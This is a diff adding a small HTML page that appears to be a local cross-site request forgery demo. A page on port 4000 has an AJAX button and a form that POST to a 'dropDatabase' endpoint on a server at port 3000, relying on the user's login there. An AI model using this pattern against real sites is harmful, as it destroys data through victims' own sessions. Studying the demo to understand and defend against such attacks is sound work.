@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+
+<script>
+ function test(){
+     var xhr = new XMLHttpRequest();
+     xhr.onreadystatechange = function() {
+         if (this.readyState == 4 && this.status == 200 ){
+             alert(this.responseText);
+         }
+     };
+     xhr.open("POST", "http://localhost:3000/api/dropDatabase", true);
+     xhr.send();
+ }
+</script>
+
+<div>I'm a web page on localhost:4000</div>
+<div>login server 3000 first</div>
+<button onclick="test()">drop DB OF 3000 via ajax</button>
+<form action="http://localhost:3000/api/dropDatabase" method="post">
+    <button type="submit">drop DB of 3000 via ajax(csrf attck)</button>
+</form>
+</body>
+</html>
